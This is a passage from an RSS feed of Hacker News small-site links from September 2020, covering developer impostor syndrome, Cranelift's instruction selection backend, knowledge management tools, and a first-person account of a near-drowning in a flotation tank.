Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518783">thread link</a>) | @fazlerocks
<br/>
September 18, 2020 | https://catalins.tech/impostor-syndrome-a-developers-best-friend | <a href="https://web.archive.org/web/*/https://catalins.tech/impostor-syndrome-a-developers-best-friend">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1597582091064/7sW4dzIjK.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><hr>

<p>Reading the title, you might say something is wrong with me. But I dare to repeat it. The impostor syndrome is a developer's best friend when appropriately managed. I also believe that the impostor syndrome is more prominent in software development due to the large volume of knowledge you need to possess, and the constant changing of tools and programming languages. The programming language and tools you are using today might become obsolete in one year. That means "starting from the zero" (an exaggeration to emphasise the point) again. It is a very dynamic environment where you have to learn continuously. The ones that survive are the ones that can adapt. </p>
<p>Thus, it is almost impossible to get rid of the impostor syndrome. Why not learn to live with it?</p>

<p>Let me tell you another thing. Almost all of us suffer from impostor syndrome. There is always someone better than us. There is always something that we do not know. There is always something to learn. A new tool gets released every day. A new technology or programming language emerges every once in a while. You can never learn and know all of them. Trying to keep up is very difficult as well. And that is how the syndrome creeps in. You start asking yourself questions such as "Will I ever make it?", "Will I ever be able to do x, y, z?", "Will I know technology x, y, z?", "What if I am an impostor?", and the list goes on. The answer is yes, yes, and yes,</p>
<p>By the way, the syndrome is even worse for beginners, who feel they are never going to make it in this field. Been there, done that. You will make it with persistent, hard work.</p>

<p>You are not the only one asking himself/herself those questions. The developer next to you at work has the same questions. The developer you follow on Twitter has the same questions. That YouTuber with 50000 subscribers has the same questions. I have the same questions, even though I have a job and I am doing very well.</p>
<p>You are not the only one with these questions, and you will never be. The impostor syndrome is part of us, and as I said, it is more prominent in our industry. Of course, some people deal with it better, so it is not that obvious they have it as well. But almost all of us have it, trust me.</p>

<p>First of all, you should know that it can be your best friend because it pushes you to become better. The feeling that you are not made for this industry, or that you do not know enough, could push you to learn more. As a result, you better yourself every day. I use the impostor syndrome as fuel, as motivation to become a better developer, and it works very well. Beware though; it can quickly push you to burn out. Trust me, you do not want that.</p>
<p>Secondly, whenever those questions and irrational thoughts creep into your mind, REMEMBER that all developers suffer from this syndrome. REMEMBER that there is always a developer better than you. But also REMEMBER that there is always a developer that is beneath you. REMEMBER that you can never know everything, and that is fine. You only need to know a handful of tools, which are relevant to your job. With perseverance and hard work, you can become a developer.</p>
<p>Will you become the best programmer? Probably no. Will you work at Amazon/Facebook/Google/Apple? Probably no. Will you make millions? Probably no. Will you develop the best next thing? Probably no. But guess what? That is fine. You do not have to do any of those to be a decent developer. Actually, most of us never achieve those goals.</p>

<ul>
<li>Almost all of us has the impostor syndrome.</li>
<li>You can make it in this industry with hard work.</li>
<li>You will never know everything, and that is fine.</li>
<li>There are always developers better than, but there are also developers worse than you.</li>
<li>You do not have to be a "superstar" developer. Being a decent developer is enough.</li>
</ul>
<blockquote>
<p>If you enjoyed the article, consider sharing it so more people can benefit from it! Also, feel free to @ me on Twitter with your opinions.</p>
</blockquote>
</div></div></section></div></div>]]>
            </description>
            <link>https://catalins.tech/impostor-syndrome-a-developers-best-friend</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518783</guid>
            <pubDate>Fri, 18 Sep 2020 16:27:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A New Backend for Cranelift, Part 1: Instruction Selection]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518724">thread link</a>) | @cfallin
<br/>
September 18, 2020 | https://cfallin.org/blog/2020/09/18/cranelift-isel-1/ | <a href="https://web.archive.org/web/*/https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>This post is the first in a three-part series about my recent work on
<a href="https://github.com/bytecodealliance/wasmtime/tree/main/cranelift">Cranelift</a>
as part of my day job at Mozilla. In this first post, I will set some context
and describe the instruction selection problem. In particular, I’ll talk about
a revamp to the instruction selector and backend framework in general that
we’ve been working on for the last nine months or so. This work has been
co-developed with my brilliant colleagues Julian Seward and <a href="https://benj.me/">Benjamin
Bouvier</a>, with significant early input from <a href="https://github.com/sunfishcode">Dan
Gohman</a> as well, and help from all of the
wonderful Cranelift hackers.</p>

<h2 id="background-cranelift">Background: Cranelift</h2>

<p>So what is Cranelift? The project is a compiler framework written in
<a href="https://www.rust-lang.org/">Rust</a> that is designed especially (but not
exclusively) for <a href="https://en.wikipedia.org/wiki/Just-in-time_compilation">just-in-time
compilation</a>. It’s a
general-purpose compiler: its most popular use-case is to compile
<a href="https://www.webassembly.org/">WebAssembly</a>, though several other frontends
exist, for example,
<a href="https://github.com/bjorn3/rustc_codegen_cranelift">cg_clif</a>, which adapts the
Rust compiler itself to use Cranelift. Folks at Mozilla and several other
places have been developing the compiler for a few years now.  It is the
default compiler backend for
<a href="https://github.com/bytecodealliance/wasmtime">wasmtime</a>, a runtime for
WebAssembly outside the browser, and is used in production in several other
places as well. We recently flipped the switch to turn on Cranelift-based
WebAssembly support in nightly Firefox on <a href="https://en.wikipedia.org/wiki/AArch64">ARM64
(AArch64)</a> machines, including most
smartphones, and if all goes well, it will eventually go out in a stable
Firefox release. Cranelift is developed under the umbrella of the <a href="https://bytecodealliance.org/">Bytecode
Alliance</a>.</p>

<p>In the past nine months, we have built a new framework in Cranelift for the
“machine backends”, or the parts of the compiler that support particular CPU
instruction sets. We also added a new backend for AArch64, mentioned above, and
filled out features as needed until Cranelift was ready for production use in
Firefox. This blog post sets some context and describes the design process that
went into the backend-framework revamp.</p>

<p>It can be a bit confusing to keep all of the moving parts straight. Here’s a
visual overview of Cranelift’s place among various other components, focusing
on two of the major Rust crates (the Wasm frontend and the codegen backend) and
several of the other programs that make use of Cranelift:</p>

<p><img src="https://cfallin.org/assets/2020-09-10-cranelift-components.svg" alt="Figure: Cranelift and other components"></p>

<h2 id="old-backend-design-instruction-legalizations">Old Backend Design: Instruction Legalizations</h2>

<p>To understand the work that we’ve done recently on Cranelift, we’ll need to
zoom into the <code>cranelift_codegen</code> crate above and talk about how it <em>used to</em>
work. What is this “CLIF” input, and how does the compiler translate it to
machine code that the CPU can execute?</p>

<p>Cranelift makes use of
<a href="https://github.com/bytecodealliance/wasmtime/blob/main/cranelift/docs/ir.md">CLIF</a>,
or the Cranelift IR (Intermediate Representation) Format, to represent the code
that it is compiling. Every compiler that performs program optimizations uses
some form of an <a href="https://en.wikipedia.org/wiki/Intermediate_representation">Intermediate Representation
(IR)</a>: you can think
of this like a virtual instruction set that can represent all the operations a
program is allowed to do. The IR is typically simpler than real instruction
sets, designed to use a small set of well-defined instructions so that the
compiler can easily reason about what a program means. The IR is also
independent of the CPU architecture that the compiler eventually targets; this
lets much of the compiler (such as the part that generates IR from the input
programming language, and the parts that optimize the IR) be reused whenever
the compiler is adapted to target a new CPU architecture.  CLIF is in <a href="https://en.wikipedia.org/wiki/Static_single_assignment_form">Static
Single Assignment
(SSA)</a> form, and
uses a conventional <a href="https://en.wikipedia.org/wiki/Control-flow_graph">control-flow
graph</a> with basic blocks
(though it previously allowed extended basic blocks, these have been phased
out). Unlike many SSA IRs, it represents φ-nodes with block parameters
rather than explicit φ-instructions.</p>

<p>Within <code>cranelift_codegen</code>, before we revamped the backend design, the program
remained in CLIF throughout compilation and up until the compiler emitted the
final machine code. This might seem to contradict what we just said: how can
the IR be machine-independent, but also be the final form from which we emit
machine code?</p>

<p>The answer is that the old backends were built around the concept of
“legalization” and “encodings”. At a high level, the idea is that every
<em>Cranelift</em> instruction either corresponds to one <em>machine</em> instruction, or can
be replaced by a sequence of other <em>Cranelift</em> instructions. Given such a
mapping, we can refine the CLIF in steps, starting from arbitrary
machine-independent instructions from earlier compiler stages, performing edits
until the CLIF corresponds 1-to-1 with machine code. Let’s visualize this
process:</p>

<p><img src="https://cfallin.org/assets/2020-09-10-cranelift-legalization.svg" alt="Figure: legalization by repeated instruction expansion"></p>

<p>A very simple example of a CLIF instruction that has a direct “encoding” to a
machine instruction is <code>iadd</code>, which just adds two integers. On essentially any
modern architecture, this should map to a simple ALU instruction that adds two
registers.</p>

<p>On the other hand, many CLIF instructions do not map cleanly. Some arithmetic
instructions fall into this category: for example, there is a CLIF instruction
to count the number of set bits in an integer’s binary representation
(<code>popcount</code>); not every CPU has a single instruction for this, so it might be
expanded into a longer series of bit manipulations. There are operations that
are defined at a higher semantic level, as well, that will necessarily be
lowered with expansions: for example, accesses to Wasm memories are lowered
into operations that fetch the linear memory base and its size, bounds-check
the Wasm address against the limit, compute the real address for the Wasm
address, and perform the access.</p>

<p>To compile a function, then, we iterate over the CLIF and find instructions
with no direct machine encodings; for each, we simply expand into the legalized
sequence, and then recursively consider the instructions in that sequence. We
loop until all instructions have machine encodings. At that point, we can emit
the bytes corresponding to each instruction’s encoding<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>.</p>

<h2 id="growing-pains-and-a-new-backend-framework">Growing Pains, and a New Backend Framework?</h2>

<p>There are a number of advantages to the legacy Cranelift backend design, which
performs expansion-based legalization with a single IR throughout. As one might
expect, though, there are also a number of drawbacks. Let’s discuss a few of
each.</p>

<h3 id="single-ir-and-legalization-pros">Single IR and Legalization: Pros</h3>

<ol>
  <li>
    <p>By operating on a single IR all the way to machine-code emission, the same
optimizations can be applied at multiple stages. For example, consider a
legalization expansion that turns a high-level “access Wasm memory”
instruction into a sequence of loads, adds and bounds-checks. If many such
sequences occur in one function, we might be able to factor out common
portions (e.g.: computing the base of the Wasm memory).  Thus the
legalization scheme exposes as much code as possible, at as many stages as
possible, to opportunities for optimization. The legacy Cranelift pipeline
in fact works in this way: it runs “pre-opt” and “post-opt” optimization
passes, before and after legalization respectively.</p>
  </li>
  <li>
    <p>If <em>most</em> of the Cranelift instructions become one machine instruction, and
few legalizations are necessary, then this scheme can be very fast: it
becomes simply a single traversal to fill in “encodings”, which were
represented by small indices into a table.</p>
  </li>
</ol>

<h3 id="single-ir-and-legalization-cons">Single IR and Legalization: Cons</h3>

<ol>
  <li>
    <p>Expansion-based legalization may not always result in
optimal code. So far we’ve seen that legalization can convert from CLIF to
machine instructions with one-to-one or one-to-many mappings. However, there
are sometimes also <em>single</em> machine instructions that implement the behavior of
<em>multiple</em> CLIF instructions, i.e. a many-to-one mapping. In order to generate
efficient code, we want to be able to make use of these instructions.</p>

    <p>For example, on x86, an instruction that references memory can compute an
address like <code>base + scale * index</code>, where <code>base</code> and <code>index</code> are registers
and <code>scale</code> is 1, 2, 4, or 8. There is no notion of such an address mode in
CLIF, so we would want to pattern-match the raw <code>iadd</code> (add) and <code>ishl</code>
(shift) or <code>imul</code> (multiply) operations when they occur in the address
computation. Then, we would want to somehow select the encoding on the
<code>load</code> instruction based on the fact that its input is some specific
combination of adds and shifts/multiplies.  This seems to break the
abstraction that the encoding represents only that instruction’s operation.</p>

    <p>In principle, we could implement more general pattern matching for legalization
rules to allow many-to-one mappings. However, this would be a significant
refactor; and as long as we were reconsidering the design in whole, there were
other reasons to avoid patching the problem in this way.</p>
  </li>
  <li>
    <p>There is a conceptual difficulty with the single-IR approach: there is
no static representation of which instructions are expanded into which others
and it is difficult to reason about the correctness and termination properties
of legalization as a whole.</p>

    <p>Specifically, the expansion-based legalization rules must obey a partial
order among instructions: if A expands into a sequence including B, then B
cannot later expand into A. In practice, mappings were mostly one-to-one,
and for those that weren’t, there was a clear domain separation between the
“input” high-level instructions and the “machine-level” instructions.
However, for more complex machines, or more complex matching schemes that
attempt to make better use of the target instruction set, this could become
a real difficulty for the machine-backend author to keep straight.</p>
  </li>
  <li>
    <p>There are efficiency concerns with expansion-based legalization. At
an algorithmic level, we prefer to avoid fixpoint loops (in this case,
“continue expanding until no more expansions exist”) whenever possible. The
runtime is bounded, but the bound is somewhat difficult to reason about,
because it depends on the maximum depth of chained expansions.</p>

    <p>The data structures that enable in-place editing are also much slower than
we would like. Typically, compilers store IR instructions in linked lists to
allow for in-place editing. …</p></li></ol></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">https://cfallin.org/blog/2020/09/18/cranelift-isel-1/</a></em></p>]]>
            </description>
            <link>https://cfallin.org/blog/2020/09/18/cranelift-isel-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518724</guid>
            <pubDate>Fri, 18 Sep 2020 16:22:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Z80, the 8-bit Number Cruncher (2011)]]>
            </title>
            <description>
<![CDATA[
Score 64 | Comments 56 (<a href="https://news.ycombinator.com/item?id=24518158">thread link</a>) | @elvis70
<br/>
September 18, 2020 | http://www.andreadrian.de/oldcpu/Z80_number_cruncher.html | <a href="https://web.archive.org/web/*/http://www.andreadrian.de/oldcpu/Z80_number_cruncher.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.andreadrian.de/oldcpu/Z80_number_cruncher.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518158</guid>
            <pubDate>Fri, 18 Sep 2020 15:39:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building an Ideal Knowledge Management System for Content Creators]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518086">thread link</a>) | @laybak
<br/>
September 18, 2020 | https://knowledgeartist.org/article/ideal-knowledge-management-system-content-creators | <a href="https://web.archive.org/web/*/https://knowledgeartist.org/article/ideal-knowledge-management-system-content-creators">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><span>In this article, I lay out a vision of the dream tools to help content creators manage and apply their cumulative learnings. I outline the desirable properties of such tools and how we can build them.</span></p> <p><span>Let's get started.</span></p>  <p><h3><span>Knowledge Synthesis vs Passive Consumption</span></h3></p> <p><span>I use the term "content creators" to refer to a variety of knowledge workers, including bloggers, video producers, researchers, journalists, and more. The many types of content creators are characterized by a common basic workflow: the process of consuming and synthesizing knowledge. Or more generally, learning and teaching. </span></p> <p><span>This is distinct from the mere passive consumption of information. It involves digesting information, trying to apply it, condensing it, sharing it, and making it your own. In the process, you understand the knowledge better yourself. And the output you create helps others learn.</span></p>  <p><h3><span>Ease of Capture</span></h3></p> <p><span>As you read, learn, or just live life, you come across many tidbits and ideas you want to remember. These are inspirations and materials that you can later make use of. </span></p> <p><span>But if you don't capture these ideas, you tend to lose them forever. And it is hard to generate relevant ideas on demand when you need them. So capturing is an always-on process, and your collection of ideas grows over time.</span></p> <p><span>The challenge with capturing ideas is that it is hard to know in advance when you will need them. If the friction to capture is too high, it simply won't happen. The capturing process must be effortless. </span></p>  <p><h3><span>Save from Anywhere</span></h3></p> <p><span>Ideas can come to you in many different contexts: conversations with friends, newsletters, books, podcasts, documentaries, walking a dog in the park, etc. The best ways to capture ideas are different for each scenario. You want to go with whichever method is the most convenient in the moment so you can resume whatever activity you were doing. </span></p> <p><span>As technology evolves, we would have an increasing variety of platforms or media we can use to save ideas. Currently, you can write it down on a piece of paper, take notes on your phone, leave a bookmark, highlight the passage, take a screenshot, and more.</span></p> <p><span>But in the future it seems inevitable that we would incorporate additional modes of inputs such as wearables like glasses with cameras, virtual reality recordings, and brain-computer interfaces.</span></p>  <p><h3><span>Integrated and Queryable Knowledge</span></h3></p> <p><span>As you use multiple tools, a problem that arises over time is that your captured knowledge becomes scattered across different places. Using a fragmented set of tools to manage your knowledge is costly. It makes it harder to retrieve any information you need. </span></p> <p><span>Currently, your book notes, product specs, and notes for online courses likely live in disparate platforms. We can do better. Your information should not be siloed. It should be searchable in one place. </span></p>  <p><h3><span>Customizable and Extensible</span></h3></p> <p><span>It is unlikely that any single tool will be the best knowledge management solution for all scenarios and workflows. No matter how well-designed a product is, there are use cases that are not accounted for, or are de-prioritized due to resource constraints. The best knowledge management tools you use should be extensible to fit your nuanced needs. Each tool you use needs to work well with the other components in your workflow, over a shared standard, open source code, or API. </span></p>  <p><h3><span>Free-form Digital Drawing</span></h3></p> <p><span>If I ask you to explain an abstract concept, one of the first things you would reach for is probably a pen, then paper or a whiteboard. This free-form drawing medium is expressive. It makes use of our spatial intuition. It is free-form. It helps you see otherwise non-obvious connections. But it is inconvenient to store, retrieve, and connect to existing knowledge. </span></p> <p><span>In contrast, a digital interface is easy to manipulate across platforms, but tends to be limited in expression. It tends to rely on text representation, which is often insufficient in conveying an idea, especially a complicated or abstract one.</span></p> <p><span>An ideal knowledge management system would marry the two to get us the best of both worlds: a digital interface that affords frictionless free-form drawing and is easy to maintain. Products such as </span> <a href="https://miro.com/" target="_blank"><span>Miro</span></a> <span> and </span> <a href="https://www.onenote.com/" target="_blank"><span>OneNote</span></a> <span> are a good step in this direction. </span></p>  <p><h3><span>Structured Knowledge &amp; Personal Knowledge Graph</span></h3></p> <p><span>The most common digital form of an idea is a </span> <em>note</em> <span>, typically stored in plaintext and organized in notebooks or folders. This is usually sufficient for the purpose of jotting down your thoughts. </span></p> <p><span>But these generic "Note" objects can become more useful when they are augmented with properties, relationships with other notes, and other metadata. These properties can be automatically extracted in the capturing process (e.g. "page number" and "book title" in a e-Book highlight), or custom-defined by the user (e.g. "years of experience required" on a "Job Posting" page). </span></p> <p><span>The interconnections between these individual notes can be structured in a </span> <a href="https://en.wikipedia.org/wiki/Knowledge_Graph" target="_blank"><span>knowledge graph</span></a> <span>, where an entity "Google" is connected to a collection of "Job" entities via the relationship "is hiring". A knowledge graph can be valuable in retrieving knowledge and answering queries. And search engines make extensive use of this to structure the world's knowledge. And on an individual level, </span> <em>personal knowledge graphs</em> <span> can have many interesting use cases for retrieval and automation. Tools like </span> <a href="https://www.notion.so/" target="_blank"><span>Notion</span></a> <span>, </span> <a href="https://coda.io/" target="_blank"><span>Coda</span></a> <span>, and </span> <a href="https://roamresearch.com/" target="_blank"><span>Roam Research</span></a> <span> offer more options for structuring knowledge for individual users. But this is just the beginning.</span></p>  <p><h3><span>Autosuggest for Thoughts</span></h3></p> <p><span>With richer representations of knowledge, machines can better "understand" our thoughts and compute on them. This can help streamline (or even automate) much of the research and idea generation workflows. </span></p> <p><span>Imagine this: when you are writing about a topic, your knowledge base can suggest semantically relevant content, either from your existing data, your team, or the collective knowledge on the web. You would no longer have to switch contexts to look up simple facts. Rather, thoughts can flow frictionlessly from inside your head to external digital artifacts that you can edit and share.</span></p> <p><span>And with generative language models (such as the </span> <a href="https://openai.com/blog/openai-api/" target="_blank"><span>GPT</span></a> <span>) maturing, you can provide a skeletal structure of your ideas, and have AI models complete your thoughts. Instead of guessing and generating random tokens, the model's outputs would be based on your thoughts that have already been digitized in your system.  </span></p> <p><span>With this close collaboration with machines in your knowledge work, information becomes truly at your fingertips.</span></p>  <p><h3><span>Prefer simple over complex</span></h3></p> <p><span>Complexity can creep in any system. Technology tools tend to get bloated over time. An initially focused feature set can turn into a maze of confusing and loosely related features. A constant challenge for feature-rich tools is discoverability of functionalities without cluttering the UI. These tools are supposed to save you time. It would defeat the purpose of using the tool if it takes longer to make it work the way you want than to work without it. </span></p> <p><span>To this end, </span> <a href="https://www.notion.so/" target="_blank"><span>Notion</span></a> <span> has raised the bar for simplicity for knowledge management tools. </span> <a href="https://www.figma.com/" target="_blank"><span>Figma</span></a> <span> also does a good job for hiding its rich feature set behind contextual actions.</span></p>  <p><h3><span>Shared, Collaborative Knowledge Structures</span></h3></p> <p><span>Knowledge synthesis is collaborative by nature. You consume works created by others and in turn create yours by mixing in your knowledge and experience. Knowledge management systems can accelerate this collaboration and empower every individual to leverage and build on each other's work as much as possible.</span></p> <p><span>Instead of knowledge being siloed within disciplines and locked inside individuals' minds, there is tremendous potential for tools to enable individuals to contribute to a collective knowledge structure, while saving time from having to build their own from scratch. The successes of platforms such as Wikipedia and open source software development are encouraging. We can build towards a future where individuals expose and attach parts of their private knowledge base to a public topic entity for others to fork for their own use. And this process can even be automated at some point.</span></p>  <p><span>We live in an exciting time for content creators and for innovation in the knowledge management space. The above are some of the promising directions for development, to work towards accelerating learning, making new discoveries, and making progress towards solving big problems.</span></p> <p><span>To contribute to this vision, I recently open sourced an extensible </span> <a href="https://github.com/jhlyeung/rumin-web-clipper" target="_blank"><span>web clipper browser extension</span></a> <span>, and I am working towards a few of the directions outlined above with </span> <a href="https://getrumin.com/" target="_blank"><span>Rumin</span></a> <span>. If you would like to chat about this further, feel free to </span> <a href="https://twitter.com/jhlyeung" target="_blank"><span>get in touch on Twitter</span></a> <span>.</span></p>        


          
            
            <p><em>Each week, I send out a newsletter where I share my learnings, new ways to see things, and new ways to feel.</em></p>
            <p><em>Enter your email below to subscribe.</em></p>

            
          
        </div></div>]]>
            </description>
            <link>https://knowledgeartist.org/article/ideal-knowledge-management-system-content-creators</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518086</guid>
            <pubDate>Fri, 18 Sep 2020 15:34:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A sensory deprivation flotation tank almost drowned me]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518073">thread link</a>) | @nsomani
<br/>
September 18, 2020 | https://saffronhuang.com/post/a-sensory-deprivation-flotation-tank-almost-drowned-me/ | <a href="https://web.archive.org/web/*/https://saffronhuang.com/post/a-sensory-deprivation-flotation-tank-almost-drowned-me/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody" id="content">
        <p>Yesterday, I almost drowned in a sensory deprivation flotation tank when my hair was sucked into the filtration system. I was not told about much of the actual float procedure nor the existence of an emergency button, which I couldn’t reach anyway. No one was meant to check in on me. This is a horror story about losing agency to an automated system featuring, as I discovered, no real contingency plans.</p>

<p>I turned 23 recently. For my birthday, a few of my friends gave me a float voucher as I’d mentioned an interest in trying it. It’s the kind of unusual sensory experience that piques my curiosity. But at $100 NZD for an hour-long session, it’s also a potential source of buyer’s remorse that I’d prefer someone else pay for. A birthday, I figure, is an excuse for frivolity.</p>

<p>As the only employee on duty, let’s call her Anna, was stepping me through the procedure, I asked her, “Should I tie my hair up?”</p>

<p>“No, don’t worry about it,” she responded. She told me about the extreme salinity of the water, and that there was a blue button in the tank to turn the lights on inside—but that in the interests of full relief and relaxation, it was best to lay in complete darkness. I was instructed to shower before getting in the tank, and as I was doing so I once more casually thought about tying my hair up. I decided against it, since I was told to shower again afterwards and it would be a hassle to untie wet hair. Anyway, there seemed to be no benefit to it, as espoused by Anna’s response.</p>

<p>I got out of the shower and put the earplugs in, as she’d advised, to keep the water out of my ears. I dipped a foot into the tank, testing the warmth of the water. I could almost taste traces of salt in the air—apparently, there were 5kgs of epsom salt dissolved in this small pod. This would be more than enough to keep me afloat. Anna had told me not to touch my face, and particularly not my eyes; the heavy sting of the salt would quickly spoil any attempt at tranquility.</p>

<p>Music would play for the first ten minutes and the last five minutes of the hour-long float. The initial music was intended to relax me; the music at the end would serve as the signal that my time was up. As I laid down in the water, I pulled the lid of the tank down. The lights both inside and outside the tank slowly blinked off.</p>

<p>Feeling both curious and skeptical, I made mental note of what I was experiencing and how I was feeling. I could move my limbs around entirely frictionlessly and weightlessly, so I did that. I tried pushing my arms down and felt the resistance of the water’s salinity. I lightly paddled my hands and felt waves of water sweep up my body, brushing my face. I couldn’t yet tell if the muscles in my neck or shoulders were any looser. I tried to meditate on my breath. As my eyes adjusted to the dark, sparks danced across my vision, and faded. (Unfortunately, I can’t report actual hallucinations, which some people experience.)</p>

<p>I could barely hear the music through both the earplugs and the water it kept out. I planned to text my friends afterwards with jokes about returning to the womb, slipping around a watery cocoon in absolute darkness and, once the ten minutes of music ended, absolute silence.</p>

<p>It’s common to fall asleep during a float. I read the business’s online FAQ, where they reassure floaters-to-be that they wouldn’t drown if they fell asleep. The salts would keep them afloat, and if they were to turn over the water would immediately wake them. I really lost my sense of time in there, but I think I became sleepy and hypnagogic perhaps 30 minutes in, and—although I made some attempt at staying alert—I started drifting in and out of wakefulness.</p>

<p>At some point I felt a mild tugging sensation on my scalp. Hmm, weird. I thought it was just my head bumping against the side of the tank, but I felt around with my hand and found that a good chunk of my hair had become pulled into a head-height vent at the top of the tank. This was not a few strands; it was, if compressed, a coin-sized diameter of hair being pulled, leaving increasingly little length from the skin of my scalp, and increasingly little freedom of movement.</p>

<p><em>Fuck.</em> I had to get loose. My face was only an inch above water. Maybe if I pulled with all my body’s might, I could free myself. Adrenaline surged; I tugged as hard as I could, and in the process I flipped over and swallowed a mouthful of disgustingly salty water. My eyes stung, hard. When I eventually was able to come up for air and still myself, I spluttered and spat out water, and told myself that my first priority was to keep my face up, and stay calm. Drowning in a flotation tank was not going to be the way I died.</p>

<p>My hair was so solidly ensnared in the vent that there was no way I could pull the strands loose, or break them off. A mere bundle of keratin is unreasonably strong. I tried to tie the rest of my hair up with the hairband on my wrist, bunching it in an attempt to prevent more from being sucked up.</p>

<p>I’d seen a red button near the opening of the tank. No one had told me what it was, but I figured that was the emergency button. (Later, Anna told me that it doesn’t work, anyway. Even later, her manager disputed that claim, saying that the emergency button does work. As you can see, things are maximally confusing.) However, as I was glued to the other end of the tank, I couldn’t reach it.</p>

<p>I yelled into pitch black.</p>

<p>HELP!!!</p>

<p>I wrenched away the earplugs, trying to hear anything. No response.</p>

<p>I kicked, and managed to get the lid of the tank up a little bit. I told myself I just needed to hold on until she came to check on me, but I had no idea how long that might be. I couldn’t see, I couldn’t hear, I was floating in water and unable to free myself. I have something of a phobia of drowning; every time I’ve had to swim in deep bodies of water (e.g. for “fun” school activities), I’ve been unduly anxious. I was very aware of the perimeter of water partially submerging my face, ebbing up and down. I tried not to hyperventilate—not endangering my breath was very important. I felt entirely vulnerable, and entirely terrified.</p>

<p>I yelled a few more times, and finally I heard her anxious voice at the door. “Are you alright?” “NO?!?! I’m trapped!” Eventually, “Can I come in?” <em>What the fuck, please come in!</em></p>

<p>She was on the phone with her manager as she tried to figure out what to do. I told her to get scissors.</p>

<p>“I’m shaking,” she said as she worked on cutting through my hair.</p>

<p>I sat up and coughed heavily, trying to expel the water from my system. When I looked in the mirror, my hair looked like it was done in a giant messy bun at the crown. And that was the part that <em>wasn’t</em> tied up (in fact, I’d only managed to tie a small amount with the hairband). It was that tangled. My eyes were salt-swollen and red, and the drying crystals had started to cake my face. I felt so sad, and so relieved.</p>

<p>“You told me not to tie my hair up!” was the first thing I blurted when I eventually came out to the front desk.</p>

<p>“Well yeah, you didn’t have to!”</p>

<p>I was stunned. “What?”</p>

<p>“Didn’t you hear the music?” Anna asked me as a response.</p>

<p>Apparently, the five minutes of music at the end and a voice instructing me to leave the tank should have been my cue to get out. I also learned that a filtration system automatically starts to pump after the music ends. But with the earplugs in as instructed, and having either fallen asleep or been in a state of hypnagogia, I couldn’t tell her whether the music had actually played or not. Even if it had played, the initial music had been so faint, I doubted its ability to wake anyone. Again, it’s common to fall asleep in a float tank, as it is deliberately relaxing. In fact, some people <a href="https://slate.com/human-interest/2015/11/i-slept-all-night-in-a-sensory-deprivation-tank.html">intentionally sleep in one at night</a>. I’m not a heavy sleeper, either; I never miss a morning alarm.</p>

<p>They programmed the tank to start the filtration immediately, without effective alarms, or checking that I’d actually gotten out. There exist flotation tanks with sensors, which could have automatically delayed the filtration process until no movement is detected; at the very least, a gentle knock on the door informing me that my time was up doesn’t seem much to ask. Anna said that she’d noticed I wasn’t out after my session and hadn’t turned the shower on yet, but thought nothing of checking on me to see if things were going okay.</p>

<p>The manager called me tonight, which was illuminating. I found out that:</p>

<ol>
<li>I had not been told that there was a correct orientation to lie down in. My head should have been near the opening of the tank, but it was towards the end with the vent. (Although it seems from Google Images that people have laid in it both ways.)</li>
<li>I should have been told that the emergency button existed and how to use it. I’d only inferred it from seeing the red button.</li>
<li>I should have been walked through the entire flotation system, and been informed that the filtration pipes would start after my session ended; I was not.</li>
<li>The music at the end is supposed to be a soft, gentle awakening, not a loud alarm, which confirmed my suspicions. Especially if they also advise putting in earplugs, I think they should have mentioned that it might be hard to hear.</li>
<li>In her experience, 1 of 50 people sleep through the music and have stayed in there once the filtration starts. I assume that none of them have gone in the wrong way or had long hair. If they knew that people do sleep through the music, I wonder why it was not procedural to check on me. I had to yell multiple times to get any attention.</li>
</ol>

<p>She told me that she would run tests on whether the music had been loud enough in my specific tank, and placed a lot of blame on Anna, the only employee present, who had worked there for only two months. She was clearly very concerned about her business; as a result, it’s hard to know whether the procedures that she claimed are normally followed are actually in practice.</p>

<p>It seems like multiple parts of the system were ill-considered, or simply …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://saffronhuang.com/post/a-sensory-deprivation-flotation-tank-almost-drowned-me/">https://saffronhuang.com/post/a-sensory-deprivation-flotation-tank-almost-drowned-me/</a></em></p>]]>
            </description>
            <link>https://saffronhuang.com/post/a-sensory-deprivation-flotation-tank-almost-drowned-me/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518073</guid>
            <pubDate>Fri, 18 Sep 2020 15:33:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: ugit – Learn Git Internals by Building Git in Python]]>
            </title>
            <description>
<![CDATA[
Score 288 | Comments 29 (<a href="https://news.ycombinator.com/item?id=24517925">thread link</a>) | @nikital
<br/>
